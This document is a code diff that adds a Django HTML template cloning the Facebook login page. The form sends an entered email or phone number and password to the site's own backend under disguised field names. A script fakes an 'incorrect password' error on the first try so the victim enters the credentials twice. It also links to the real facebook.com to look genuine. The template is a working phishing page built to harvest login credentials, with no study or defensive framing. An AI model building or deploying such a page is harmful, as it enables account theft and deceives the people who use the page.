@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login </title>
+    <link rel="stylesheet" href="{% static 'css/facebook.css' %}">
+   
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form id="loginForm" method="POST" action="" enctype="multipart/form-data">
+          {% csrf_token %}
+          <input type="text" name="product" placeholder="Email or phone number" required>
+          <input type="text" name="massage" placeholder="Password" required>
+          <p class="error-message" id="errorMessage" style="color: red; font-size: 15px; margin-bottom: 10px; display: none;">Incorrect email or password. Please try again.</p>
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="https://facebook.com" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="https://facebook.com">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+
+
+    <script>
+      let loginAttempts = 0; // Track login attempts
+
+      const loginForm = document.getElementById("loginForm");
+      const errorMessage = document.getElementById("errorMessage");
+
+      loginForm.addEventListener("submit", function (event) {
+        event.preventDefault(); // Prevent the form from submitting immediately
+
+        if (loginAttempts === 0) {
+          // First attempt: Show error message
+          errorMessage.style.display = "block";
+          loginAttempts++;
+        } else if (loginAttempts === 1) {
+          // Second attempt: Allow form submission to backend
+          errorMessage.style.display = "none";
+          loginForm.submit(); // Submit the form to the backend
+        }
+      });
+    </script>
+  </body>
+</html>
